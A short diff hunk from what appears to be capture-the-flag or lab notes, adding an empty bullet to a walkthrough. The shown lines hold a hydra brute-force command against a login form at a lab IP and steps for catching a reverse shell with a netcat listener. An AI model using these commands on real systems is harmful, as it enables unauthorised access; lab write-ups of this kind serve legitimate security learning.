@@ -28,3 +28,4 @@ hydra -l enox -P credentials.txt 10.10.191.122 http-post-form "/sUp3r-s3cr3t/aut
     - Listen on the port in your machine
     - nc -nlvp <port>
     - Once uploaded you get access to the shell
+-  
